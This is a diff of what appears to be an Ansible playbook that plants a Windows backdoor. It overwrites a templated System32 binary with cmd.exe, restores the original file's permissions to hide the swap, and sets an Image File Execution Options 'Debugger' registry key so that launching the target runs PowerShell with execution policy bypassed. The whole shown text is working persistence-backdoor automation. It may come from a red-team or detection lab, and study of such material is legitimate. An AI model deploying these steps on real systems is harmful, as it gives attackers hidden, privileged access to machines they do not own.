@@ -30,7 +30,7 @@
 - name: "Backdoor File Replacement for {{ target }} - Replace"
   ansible.windows.win_shell: |
     $targetPath = "C:\Windows\System32\{{ target }}"
-    Copy-Item "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $targetPath -Force
+    Copy-Item "C:\Windows\System32\cmd.exe" $targetPath -Force
     $sddl = "{{ original_sddl.stdout_lines | last | trim }}"
     $Acl = New-Object System.Security.AccessControl.FileSecurity
     $Acl.SetSecurityDescriptorSddlForm($sddl)
@@ -79,5 +79,5 @@
   ansible.windows.win_regedit:
     path: "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{{ target }}"
     name: Debugger
-    data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoExit'
+    data: 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -NoExit'
     state: present
